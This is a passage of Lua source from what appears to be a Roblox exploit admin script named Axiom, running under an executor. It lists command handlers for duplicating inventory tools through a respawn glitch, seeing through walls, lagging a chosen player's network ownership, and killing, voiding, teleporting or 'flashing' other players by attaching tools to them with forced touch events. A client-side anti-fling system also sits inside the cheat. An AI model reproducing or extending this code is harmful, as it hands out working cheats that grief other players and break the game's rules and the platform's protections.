			Description = "Remove player highlight.",
			Usage = "unoutline <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					if v.Character:FindFirstChild("Highlight") then
						v.Character:FindFirstChild("Highlight"):Destroy()
					end
				end
			end
		},
	
		{
			Name = "XRay",
			Aliases = {"xray"},
			Description = "See through objects.",
			Usage = "xray",
			Arguments = {},
			Run = function(args)
				for i,gh in ipairs(workspace:GetDescendants()) do
					if gh:IsA("Part") then
						if not gh.Parent:FindFirstChild("Humanoid") or gh:IsA("SpawnLocation") then
							gh.Transparency = 0.75
						end
					end
				end
			end
		},
	
		{
			Name = "UnXRay",
			Aliases = {"unxray"},
			Description = "Disable xray mode.",
			Usage = "unxray",
			Arguments = {},
			Run = function(args)
				for i,gh in ipairs(workspace:GetDescendants()) do
					if gh:IsA("Part") then
						if not gh.Parent:FindFirstChild("Humanoid") or gh:IsA("SpawnLocation") then
							gh.Transparency = 0
						end
					end
				end
			end
		},
		{
			Name = "DupeTools",
			Aliases = {"dupetools", "dupe"},
			Description = "Dupes your inventory by certain amount.",
			Usage = "dupetools <value>",
			Arguments = {"value"},
			Run = function(args)
				local val = tonumber(args[1])
				if val == nil then notice("You Need A Value Amount To Dupe Your Tools Try dupetools 1") return end 
				val = val-1
				for i = 0,val,1 do
					local cr = getChar()
					local old = cr:FindFirstChild("HumanoidRootPart").CFrame
					for i,v in pairs(getBp():GetChildren()) do
						if v:IsA("Tool") then
							v.Name = "DupedTool"
							v.Parent = getChar()
						end
					end
					for i,v in pairs(getChar():GetChildren()) do
						if v:IsA("Tool") then
							v.Name = "DupedTool"
						end
					end
					cr.HumanoidRootPart.CFrame = cr.HumanoidRootPart.CFrame + Vector3.new(0,999999999,0)
					task.wait(0.1)
					for i,v in pairs(getChar():GetChildren()) do
						if v:IsA("Tool") then
							v.Parent = workspace
						end
					end
					plr.Character.Humanoid.Health = 0
					plr.CharacterAdded:Wait()
					getChar():WaitForChild("HumanoidRootPart").CFrame = old
					for i,v in pairs(workspace:GetChildren()) do
						if v:IsA("Tool") and v.Name == "DupedTool" then
							globalLib.firetouchinterest(v.Handle, getChar().HumanoidRootPart,0)
							task.wait()
							globalLib.firetouchinterest(v.Handle, getChar().HumanoidRootPart,1)
						end
					end
					wait(1)
				end
				local dupeditems = val
				dupeditems = dupeditems+1
				notice("Duped "..dupeditems.." Tools!")
			end
		},
		{
			Name = "AntiFling",
			Aliases = {"antifling"},
			Description = "Prevents your player from being flinged (advanced).",
			Usage = "antifling",
			Arguments = {},
			Run = function(args)
				local success, err = xpcall(function()
					local Services = setmetatable({}, {__index = function(Self, Index)
						local NewService = game.GetService(game, Index)
						if NewService then
							Self[Index] = NewService
						end
						return NewService
					end})

					local LocalPlayer = Services.Players.LocalPlayer

					if getgenv().AntiFlingSystem and getgenv().AntiFlingSystem.Stop then
						getgenv().AntiFlingSystem.Stop()
					end

					local System = { Connections = {}, Running = true }
					
					local Config = {
						OtherAngular  = 25,
						OtherLinear   = 60,
						OtherLock     = 15,

						AngularThreshold     = 12,  
						HorizontalThreshold  = 90,
						HorizontalJolt       = 45,
						VerticalJolt         = 80,
						MaxFallSpeed         = 300,
						LocalLock            = 15,

						HorizontalSpeedMul = 3,   
						HorizontalJoltMul  = 2,   
						VerticalJoltMul    = 1.5, 

						ThreatRadius   = 8,
						ThreatVelocity = 40,
						ThreatAngular  = 20,
					}
					System.Config = Config

					getgenv().AntiFlingSystem = System

					local function PlayerAdded(Player)
						local Character, PrimaryPart
						local LockTimer = 0
						local SavedCollisions = {}
						local CollisionsDisabled = false

						local function CharacterAdded(NewCharacter)
							Character = NewCharacter
							PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
							LockTimer = 0
							SavedCollisions = {}
							CollisionsDisabled = false
						end

						table.insert(System.Connections, Player.CharacterAdded:Connect(CharacterAdded))
						task.spawn(function()
							local character = Player.Character
							if not character then return end

							local timeout = 5
							local start = os.clock()

							while character and character.Parent do
								local root = character:FindFirstChild("HumanoidRootPart")
								if root then
									CharacterAdded(character)
									return
								end

								if os.clock() - start > timeout then
									warn("HumanoidRootPart timeout")
									return
								end

								task.wait()
							end
						end)
						

						table.insert(System.Connections, Services.RunService.Heartbeat:Connect(function()
							if not System.Running then return end
							if not (Character and PrimaryPart) then return end
							if not (Character:IsDescendantOf(workspace) and PrimaryPart:IsDescendantOf(Character)) then return end

							local AngVel = PrimaryPart.AssemblyAngularVelocity.Magnitude
							local LinVel = PrimaryPart.AssemblyLinearVelocity.Magnitude

							if AngVel > Config.OtherAngular or LinVel > Config.OtherLinear then
								LockTimer = Config.OtherLock
							end

							if LockTimer > 0 then
								LockTimer -= 1

								if not CollisionsDisabled then
									for _, part in ipairs(Character:GetDescendants()) do
										if part:IsA("BasePart") then
											SavedCollisions[part] = part.CanCollide
											part.CanCollide = false
										end
									end
									CollisionsDisabled = true
								end

								for _, part in ipairs(Character:GetDescendants()) do
									if part:IsA("BasePart") then
										part.AssemblyAngularVelocity = Vector3.zero
										part.AssemblyLinearVelocity = Vector3.zero
										part.CustomPhysicalProperties = PhysicalProperties.new(0.01, 0, 0)
									end
								end
							elseif CollisionsDisabled then
								for part, original in pairs(SavedCollisions) do
									if part and part.Parent then
										part.CanCollide = original
									end
								end
								SavedCollisions = {}
								CollisionsDisabled = false
							end
						end))
					end

					for _, v in ipairs(Services.Players:GetPlayers()) do
						if v ~= LocalPlayer then
							PlayerAdded(v)
						end
					end
					table.insert(System.Connections, Services.Players.PlayerAdded:Connect(PlayerAdded))

					local LastPosition, LastVelocity, LocalLock
					local SavedCollisions = {}
					local CollisionsDisabled = false

					local function RestoreCollisions()
						for part, original in pairs(SavedCollisions) do
							if part and part.Parent then part.CanCollide = original end
						end
						SavedCollisions = {}
						CollisionsDisabled = false
					end

					local function ResetLocalState()
						LastPosition = nil
						LastVelocity = Vector3.zero
						LocalLock = 0
						RestoreCollisions()
					end
					ResetLocalState()
					table.insert(System.Connections, LocalPlayer.CharacterAdded:Connect(ResetLocalState))

					local function GetThreatParts(Character, PrimaryPart)
						local Params = OverlapParams.new()
						Params.FilterType = Enum.RaycastFilterType.Exclude
						Params.FilterDescendantsInstances = {Character}

						local Threats = {}
						local ok, Nearby = pcall(workspace.GetPartBoundsInRadius, workspace, PrimaryPart.Position, Config.ThreatRadius, Params)
						if not ok then return Threats end

						for _, part in ipairs(Nearby) do
							if part:IsA("BasePart") and part.CanCollide then
								if part.AssemblyLinearVelocity.Magnitude > Config.ThreatVelocity
									or part.AssemblyAngularVelocity.Magnitude > Config.ThreatAngular then
									table.insert(Threats, part)
								end
							end
						end
						return Threats
					end

					table.insert(System.Connections, Services.RunService.Heartbeat:Connect(function()
						if not System.Running then return end
						if tempdisableantifling then return end
						local Character = LocalPlayer.Character
						if not Character then return end
						local PrimaryPart = Character:FindFirstChild("HumanoidRootPart")
						local Humanoid = Character:FindFirstChildOfClass("Humanoid")
						if not PrimaryPart or not Humanoid then return end

						if Humanoid.SeatPart then
							LastPosition = PrimaryPart.CFrame
							LastVelocity = PrimaryPart.AssemblyLinearVelocity
							LocalLock = 0
							if CollisionsDisabled then RestoreCollisions() end
							return
						end

						local LinVel = PrimaryPart.AssemblyLinearVelocity
						local AngVel = PrimaryPart.AssemblyAngularVelocity

						local AngularTumble = Vector3.new(AngVel.X, 0, AngVel.Z).Magnitude

						local HorizontalSpeed = Vector3.new(LinVel.X, 0, LinVel.Z).Magnitude
						local VerticalSpeed = math.abs(LinVel.Y)

						local Delta = LinVel - LastVelocity
						local HorizontalJolt = Vector3.new(Delta.X, 0, Delta.Z).Magnitude
						local VerticalJolt = math.abs(Delta.Y)

						local IsFreefall = Humanoid:GetState() == Enum.HumanoidStateType.Freefall

						local HorizontalCap     = math.max(Config.HorizontalThreshold, Humanoid.WalkSpeed * Config.HorizontalSpeedMul)
						local HorizontalJoltCap = math.max(Config.HorizontalJolt, Humanoid.WalkSpeed * Config.HorizontalJoltMul)
						local VerticalJoltCap   = math.max(Config.VerticalJolt, Humanoid.JumpPower * Config.VerticalJoltMul)

						local Flinging = false
						if AngularTumble > Config.AngularThreshold then Flinging = true end
						if HorizontalSpeed > HorizontalCap then Flinging = true end
						if HorizontalJolt > HorizontalJoltCap then Flinging = true end
						if VerticalJolt > VerticalJoltCap then Flinging = true end
						if VerticalSpeed > Config.MaxFallSpeed and not IsFreefall then Flinging = true end

						LastVelocity = LinVel

						if Flinging then
							LocalLock = Config.LocalLock
						end

						if LocalLock > 0 and LastPosition then
							LocalLock -= 1

							if not CollisionsDisabled then
								for _, part in ipairs(Character:GetDescendants()) do
									if part:IsA("BasePart") then
										SavedCollisions[part] = part.CanCollide
										part.CanCollide = false
									end
								end
								for _, part in ipairs(GetThreatParts(Character, PrimaryPart)) do
									if SavedCollisions[part] == nil then
										SavedCollisions[part] = part.CanCollide
										part.CanCollide = false
									end
								end
								CollisionsDisabled = true
							end

							PrimaryPart.AssemblyAngularVelocity = Vector3.zero
							PrimaryPart.AssemblyLinearVelocity = Vector3.zero
							PrimaryPart.CFrame = LastPosition
						else
							if CollisionsDisabled then RestoreCollisions() end
							LastPosition = PrimaryPart.CFrame
						end
					end))

					function System.Stop()
						RestoreCollisions()
						for _, c in ipairs(System.Connections) do
							if c.Connected then c:Disconnect() end
						end
						System.Running = false
					end

					notice("Axiom Advanced Anti Fling Is Enabled")
				end, debug.traceback)

				if not success then
					warn("=== ANTIFLING ERROR ===")
					warn(err)

					if notice then
						notice(tostring(err))
					end
				end
			end
		},
		{
			Name = "UnAntiFling",
			Aliases = {"unantifling"},
			Description = "Disables the AntiFling system.",
			Usage = "unantifling",
			Arguments = {},
			Run = function(args)
				local System = getgenv().AntiFlingSystem
				if System and System.Stop then
					System.Stop()
					getgenv().AntiFlingSystem = nil
					notice("Axiom Advanced Anti Fling Is Disabled")
				end
			end
		},
				
		{
			Name = "ResetVoiceChat",
			Aliases = {"resetvoicechat", "resetvc", "rvc"},
			Description = "Rejoins voice chat.",
			Usage = "resetvoicechat",
			Arguments = {},
			Run = function(args)
				game:GetService("VoiceChatService"):joinVoice()
			end
		},

		{
			Name = "EquipTools",
			Aliases = {"equiptools"},
			Description = "Equips all tools in your inventory.",
			Usage = "equiptools",
			Arguments = {},
			Run = function(args)
				for i,v in pairs(getBp():GetChildren()) do
					if v:IsA("Tool") then
						v.Parent = getChar()
					end
				end
			end
		},
		{
			Name = "DropTools",
			Aliases = {"droptools"},
			Description = "Drops all tools in your inventory.",
			Usage = "droptools",
			Arguments = {},
			Run = function(args)
				for i,v in pairs(getBp():GetChildren()) do
					if v:IsA("Tool") then
						v.Parent = getChar()
						task.wait()
					end
				end
				wait()
				for i,v in pairs(getChar():GetChildren()) do
					if v:IsA("Tool") then
						v.Parent = workspace
					end
				end
			end
		},
		{
			Name = "GrabAllTools",
			Aliases = {"graballtools", "firetouchtools", "ftt"},
			Description = "Grabs all tools in the workspace to your inventory.",
			Usage = "graballtools",
			Arguments = {},
			Run = function(args)
				for i,v in pairs(workspace:GetChildren()) do
					if v:IsA("Tool") and v:FindFirstChild("Handle") then
						globalLib.firetouchinterest(v:FindFirstChild("Handle"), getChar().HumanoidRootPart, 0)
        				globalLib.firetouchinterest(v:FindFirstChild("Handle"), getChar().HumanoidRootPart, 1)
					end
				end
			end
		},
		{
			Name = "FireTouchInterests",
			Aliases = {"firetouchinterests","firetouch", "fti"},
			Description = "Fires all touch interest in workspace.",
			Usage = "firetouchinterests",
			Arguments = {},
			Run = function(args)
				for i,v in pairs(workspace:GetDescendants()) do
					if v:IsA("TouchTransmitter") then
						globalLib.firetouchinterest(v.Parent, getChar().HumanoidRootPart, 0)
        				globalLib.firetouchinterest(v.Parent, getChar().HumanoidRootPart, 1)
					end
				end
			end
		},
		{
			Name = "NetworkLag",
			Aliases = {"networklag", "netlag"},
			Description = "Lags a player's ownership for others.",
			Usage = "networklag <player>",
			Arguments = {"player"},
			Run = function(args)
				if networkownershipall == false then notice("NetworkLag could work more better if NetworkOwnership was enabled") end
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					table.insert(netsleepTargets,v)
				end
			end
		},
		{
			Name = "UnNetworkLag",
			Aliases = {"unnetworklag", "unnetlag"},
			Description = "Removes network lag from a player.",
			Usage = "unnetworklag <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					table.remove(netsleepTargets,table.find(netsleepTargets,v))
				end
			end
		},
		{
			Name = "AttachKill",
			Aliases = {"attachkill", "akill"},
			Description = "Kills a player by attaching them to a falling object.",
			Usage = "attachkill <player>",
			Arguments = {"player"},
			Run = function(args)
				notice("Axiom warning: this command may not run due to Workspace.RejectCharacterDeletions you may have to use FixCharacter")
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					if v.Character:FindFirstChild("Humanoid") or v.Character:FindFirstChild("HumanoidRootPart") then
						if v.Character:FindFirstChild("Humanoid").Health <=0 then 
							notice("Axiom prevent a action from running due to: Target is dead")
							return
						end
						if not v.Character:FindFirstChild("HumanoidRootPart") then 
							notice("Axiom prevent a action from running due to: Target is dead or destroyed")
							return
						end
					end
					local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
					local origFpdh = workspace.FallenPartsDestroyHeight
					local oldcf = getChar():FindFirstChild("HumanoidRootPart").CFrame
					local oldchar = getChar()
					if tool == nil then 
						notice("Axiom prevent a command from running due to: tool == nil")
						return end
					tool.Handle.CanCollide = false
					DestroyHumToAttach()
					tool.Parent = getChar()
					task.wait()
					repeat 
						globalLib.firetouchinterest(tool.Handle,v.Character.HumanoidRootPart,0)
					until tool.Parent == v.Character or tool == nil
					if tool ~= nil then
						setHumState(plr.Character.Humanoid, Enum.HumanoidStateType.GettingUp, true)
						setHumState(plr.Character.Humanoid, Enum.HumanoidStateType.Landed, true)
						setHumState(plr.Character.Humanoid, Enum.HumanoidStateType.Running, true)
						game.Players.LocalPlayer.Character.Humanoid.Health = -60000
						getChar().Head:Destroy()
						game.Players.LocalPlayer.Character=v.Character
						game.Players.LocalPlayer.Character.Humanoid.Health = -60000
						setHumState(plr.Character.Humanoid, Enum.HumanoidStateType.GettingUp, true)
						setHumState(plr.Character.Humanoid, Enum.HumanoidStateType.Landed, true)
						setHumState(plr.Character.Humanoid, Enum.HumanoidStateType.Running, true)
						
						plr.CharacterAdded:Wait(); 
						getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").CFrame = oldcf
					end
				end
			end
		},
		{
			Name = "FixCharacter",
			Aliases = {"fixcharacter", "fixchar"},
			Description = "Fixes your character if in a broken state.",
			Usage = "fixcharacter",
			Arguments = {},
			Run = function(args)
				workspace.FallenPartsDestroyHeight = savedFallenPDH
				task.wait()
				local hum = getChar():FindFirstChildOfClass("Humanoid") or Instance.new("Humanoid", getChar())
				getChar():BreakJoints()
				for _, part in ipairs(getChar():GetDescendants()) do
					if part:IsA("BasePart") then
						workspace.FallenPartsDestroyHeight = savedFallenPDH
						local a = tws:Create(part,tweeninfo,{CFrame=CFrame.new(0,-1000,0)})
						a:Play()
						setHumState(hum, Enum.HumanoidStateType.GettingUp, true)
						setHumState(hum, Enum.HumanoidStateType.Landed, true)
						setHumState(hum, Enum.HumanoidStateType.Running, true)
					end
				end
			end
		},
		{
			Name = "AttachBring",
			Aliases = {"attachbring", "abring"},
			Description = "Brings a player by attaching them to a falling object.",
			Usage = "attachbring <player>",
			Arguments = {"player"},
			Run = function(args)
				notice("Axiom warning: this command may not run due to Workspace.RejectCharacterDeletions you may have to use FixCharacter")
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					if v.Character:FindFirstChild("Humanoid") or v.Character:FindFirstChild("HumanoidRootPart") then
						if v.Character:FindFirstChild("Humanoid").Health <=0 then 
							notice("Axiom prevent a action from running due to: Target is dead")
							return
						end
						if not v.Character:FindFirstChild("HumanoidRootPart") then 
							notice("Axiom prevent a action from running due to: Target is dead or destroyed")
							return
						end
					end
					local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
					local oldcf = getChar():FindFirstChild("HumanoidRootPart").CFrame
					if tool == nil then 
						notice("Axiom prevent a command from running due to: tool == nil")
						return end
					tool.Parent = getBp()
					tool.Handle.CanCollide = false
					tool.Handle.Massless = true
					tool.GripPos = Vector3.new(0, -2, 5)
					DestroyHumToAttach()
					tool.Parent = getChar()
					task.wait()
					repeat 
						globalLib.firetouchinterest(v.Character.HumanoidRootPart,tool.Handle,0)
					until tool.Parent == v.Character or tool == nil
					if tool ~= nil then
						destroyGrip()
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.GettingUp, true)
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.Landed, true)
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.Running, true)
						
						getChar():FindFirstChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").CFrame = oldcf
						task.wait(2)
						getChar():FindFirstChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						plr.CharacterAdded:Wait(); 
						getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").CFrame = oldcf
					end
				end
			end
		},
		{
			Name = "AttachVoid",
			Aliases = {"attachvoid", "avoid", "abanish"},
			Description = "Voids a player by attaching them to a falling object.",
			Usage = "attachvoid <player>",
			Arguments = {"player"},
			Run = function(args)
				notice("Axiom warning: this command may not run due to Workspace.RejectCharacterDeletions you may have to use FixCharacter")
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					if v.Character:FindFirstChild("Humanoid") or v.Character:FindFirstChild("HumanoidRootPart") then
						if v.Character:FindFirstChild("Humanoid").Health <=0 then 
							notice("Axiom prevent a action from running due to: Target is dead")
							return
						end
						if not v.Character:FindFirstChild("HumanoidRootPart") then 
							notice("Axiom prevent a action from running due to: Target is dead or destroyed")
							return
						end
					end
					local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
					local oldcf = getChar():FindFirstChild("HumanoidRootPart").CFrame
					if tool == nil then 
						notice("Axiom prevent a command from running due to: tool == nil")
						return end
					tool.Handle.CanCollide = false
					DestroyHumToAttach()
					tool.Parent = getChar()
					task.wait()
					tempdisableantifling = true
					repeat 
						globalLib.firetouchinterest(v.Character.HumanoidRootPart,tool.Handle,0)
					until tool.Parent == v.Character or tool == nil
					if tool ~= nil then
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.GettingUp, true)
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.Landed, true)
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.Running, true)
						
						getChar():FindFirstChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(0,10000000000000000000,0)
						for i = 1,10 do
							getChar():FindFirstChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.new(0,10000000000000000000,0)
							task.wait()
						end
						task.wait(1)
						destroyGrip()
						getChar():FindFirstChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").CFrame = oldcf
						plr.CharacterAdded:Wait(); 
						getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").CFrame = oldcf
						tempdisableantifling = false
					end
				end
			end
		},
		{
			Name = "AttachFlash",
			Aliases = {"attachflash","aflash", "ablind"},
			Description = "Flashes a player by attaching them to a falling object.",
			Usage = "attachflash <player>",
			Arguments = {"player"},
			Run = function(args)
				notice("Axiom warning: this command may not run due to Workspace.RejectCharacterDeletions you may have to use FixCharacter")
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					if v.Character:FindFirstChild("Humanoid") or v.Character:FindFirstChild("HumanoidRootPart") then
						if v.Character:FindFirstChild("Humanoid").Health <=0 then 
							notice("Axiom prevent a action from running due to: Target is dead")
							return
						end
						if not v.Character:FindFirstChild("HumanoidRootPart") then 
							notice("Axiom prevent a action from running due to: Target is dead or destroyed")
							return
						end
					end
					local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
					local oldcf = getChar():FindFirstChild("HumanoidRootPart").CFrame
					if tool == nil then 
						notice("Axiom prevent a command from running due to: tool == nil")
						return end
					tool.Handle.CanCollide = false
					DestroyHumToAttach()
					tool.Parent = getChar()
					task.wait()
					tempdisableantifling = true
					repeat 
						globalLib.firetouchinterest(v.Character.HumanoidRootPart,tool.Handle,0)
					until tool.Parent == v.Character or tool == nil
					if tool ~= nil then
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.GettingUp, true)
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.Landed, true)
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.Running, true)
						
						getChar():FindFirstChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						for i = 1, 15 do
							getChar():FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(0,10000000000000000000,0)
							task.wait(0.15)
							getChar():FindFirstChild("HumanoidRootPart").CFrame = oldcf
							task.wait(0.15)
						end
						
						getChar():FindFirstChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").CFrame = oldcf
						plr.CharacterAdded:Wait(); 
						getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").CFrame = oldcf
						tempdisableantifling = false
					end
				end
			end
		},
		{
			Name = "AttachInstantVoid",
			Aliases = {"attachinstantvoid", "ainstavoid", "aivoid"},
			Description = "Voids a player by attaching them to a falling object killing them instantly.",
			Usage = "attachinstantvoid <player>",
			Arguments = {"player"},
			Run = function(args)
				notice("Axiom warning: this command may not run due to Workspace.RejectCharacterDeletions you may have to use FixCharacter")
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					if v.Character:FindFirstChild("Humanoid") or v.Character:FindFirstChild("HumanoidRootPart") then
						if v.Character:FindFirstChild("Humanoid").Health <=0 then 
							notice("Axiom prevent a action from running due to: Target is dead")
							return
						end
						if not v.Character:FindFirstChild("HumanoidRootPart") then 
							notice("Axiom prevent a action from running due to: Target is dead or destroyed")
							return
						end
					end
					local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
					local oldcf = getChar():FindFirstChild("HumanoidRootPart").CFrame
					local origFpdh = workspace.FallenPartsDestroyHeight
					if tool == nil then 
						notice("Axiom prevent a command from running due to: tool == nil")
						return end
						workspace.FallenPartsDestroyHeight = 0/0
					tool.Parent = getBp()
					tool.Handle.CanCollide = false
					tool.Handle.Massless = true
					tool.GripPos = Vector3.new(0, 9000, 0)
					DestroyHumToAttach()
					tool.Parent = getChar()
					task.wait()
					repeat 
						globalLib.firetouchinterest(v.Character.HumanoidRootPart,tool.Handle,0)
					until tool.Parent == v.Character or tool == nil
					if tool ~= nil then
						destroyGrip()
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.GettingUp, true)
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.Landed, true)
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.Running, true)
						for i = 1, 10 do
							getChar():FindFirstChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
							getChar():FindFirstChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
							getChar():FindFirstChild("HumanoidRootPart").CFrame = oldcf
							task.wait()
						end
						plr.CharacterAdded:Wait(); 
						getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").CFrame = oldcf
					end
				end
			end
		},
		{
			Name = "AttachKill2",
			Aliases = {"attachkill2", "akill2"},
			Description = "Kills a player with a falling object.",
			Usage = "attachkill2 <player>",
			Arguments = {"player"},
			Run = function(args)
				notice("Axiom warning: this command may not run due to Workspace.RejectCharacterDeletions you may have to use FixCharacter")
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					if v.Character:FindFirstChild("Humanoid") or v.Character:FindFirstChild("HumanoidRootPart") then
						if v.Character:FindFirstChild("Humanoid").Health <=0 then 
							notice("Axiom prevent a action from running due to: Target is dead")
							return
						end
						if not v.Character:FindFirstChild("HumanoidRootPart") then 
							notice("Axiom prevent a action from running due to: Target is dead or destroyed")
							return
						end
					end
					local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
					local origFpdh = workspace.FallenPartsDestroyHeight
					local oldcf = getChar():FindFirstChild("HumanoidRootPart").CFrame
					local oldchar = getChar()
					if tool == nil then 
						notice("Axiom prevent a command from running due to: tool == nil")
						return end
					tool.Handle.CanCollide = false
					DestroyHumToAttach()
					tool.Parent = getChar()
					task.wait()
					repeat 
						globalLib.firetouchinterest(tool.Handle,v.Character.HumanoidRootPart,0)
					until tool.Parent == v.Character or tool == nil
					if tool ~= nil then
						setHumState(plr.Character.Humanoid, Enum.HumanoidStateType.GettingUp, true)
						setHumState(plr.Character.Humanoid, Enum.HumanoidStateType.Landed, true)
						setHumState(plr.Character.Humanoid, Enum.HumanoidStateType.Running, true)
						game.Players.LocalPlayer.Character.Humanoid.Health = -60000
						getChar().Head:Destroy()
						game.Players.LocalPlayer.Character=v.Character
						game.Players.LocalPlayer.Character.Humanoid.Health = -60000
						setHumState(plr.Character.Humanoid, Enum.HumanoidStateType.GettingUp, true)
						setHumState(plr.Character.Humanoid, Enum.HumanoidStateType.Landed, true)
						setHumState(plr.Character.Humanoid, Enum.HumanoidStateType.Running, true)
						task.wait(2)
						oldchar:Destroy()
						plr.CharacterAdded:Wait(); 
						getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").CFrame = oldcf
					end
				end
			end
		},
		{
			Name = "AttachBring2",
			Aliases = {"attachbring2", "abring2"},
			Description = "Brings a player with a falling object.",
			Usage = "attachbring2 <player>",
			Arguments = {"player"},
			Run = function(args)
				notice("Axiom warning: this command may not run due to Workspace.RejectCharacterDeletions you may have to use FixCharacter")
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					if v.Character:FindFirstChild("Humanoid") or v.Character:FindFirstChild("HumanoidRootPart") then
						if v.Character:FindFirstChild("Humanoid").Health <=0 then 
							notice("Axiom prevent a action from running due to: Target is dead")
							return
						end
						if not v.Character:FindFirstChild("HumanoidRootPart") then 
							notice("Axiom prevent a action from running due to: Target is dead or destroyed")
							return
						end
					end
					local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
					local oldcf = getChar():FindFirstChild("HumanoidRootPart").CFrame
					if tool == nil then 
						notice("Axiom prevent a command from running due to: tool == nil")
						return end
					tool.Parent = getBp()
					tool.Handle.CanCollide = false
					tool.Handle.Massless = true
					tool.GripPos = Vector3.new(0, -2, 5)
					DestroyHumToAttach()
					tool.Parent = getChar()
					task.wait()
					repeat 
						globalLib.firetouchinterest(v.Character.HumanoidRootPart,tool.Handle,0)
					until tool.Parent == v.Character or tool == nil
					if tool ~= nil then
						destroyGrip()
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.GettingUp, true)
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.Landed, true)
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.Running, true)
						
						getChar():FindFirstChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").CFrame = oldcf
						task.wait()
						getChar():Destroy()
						plr.CharacterAdded:Wait(); 
						getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").CFrame = oldcf
					end
				end
			end
		},
		{
